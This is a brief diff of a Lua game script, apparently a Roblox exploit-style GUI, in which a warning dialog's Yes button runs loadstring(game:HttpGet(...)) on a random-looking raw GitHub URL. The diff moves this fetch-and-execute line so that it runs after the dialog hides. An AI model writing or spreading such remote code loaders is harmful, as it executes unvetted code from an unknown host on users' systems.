@@ -1535,8 +1535,8 @@ local function APHL_fake_script() -- Debugger.CoreClient
 		WarningFrame.Visible = true
 	end)
 	YesButton.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/A.Debugger"))()
 		WarningFrame.Visible = false
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/A.Debugger"))()
 	end)
 	NoButton.MouseButton1Click:Connect(function()
 		WarningFrame.Visible = false
